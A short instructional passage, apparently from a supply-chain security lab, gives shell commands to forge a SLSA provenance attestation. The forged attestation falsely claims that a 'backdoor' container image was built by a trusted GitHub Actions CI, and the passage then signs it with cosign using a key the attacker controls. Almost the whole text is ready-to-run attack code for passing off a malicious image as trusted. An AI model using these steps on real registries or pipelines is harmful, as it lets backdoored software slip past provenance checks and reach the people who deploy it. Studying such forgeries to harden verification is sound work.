Create a forged attestation that claims a malicious image was built by
your trusted CI:

```
MALICIOUS_DIGEST=$(crane digest registry:5000/webapp:backdoor)

cat > /app/forged-attestation.json << EOF
{
  "_type": "https://in-toto.io/Statement/v0.1",
  "predicateType": "https://slsa.dev/provenance/v0.2",
  "subject": [
    {
      "name": "registry:5000/webapp",
      "digest": {"sha256": "${MALICIOUS_DIGEST#sha256:}"}
    }
  ],
  "predicate": {
    "builder": {"id": "https://github.com/actions/runner"},
    "buildType": "https://github.com/actions/runner/github-hosted",
    "invocation": {
      "configSource": {
        "uri": "git+https://github.com/org/webapp@refs/heads/main"
      }
    }
  }
}
EOF
```

Now sign it with a key you control:

```
cosign attest --key /app/cosign.key \
  --predicate /app/forged-attestation.json \
  --type slsaprovenance \
  registry:5000/webapp:backdoor
```
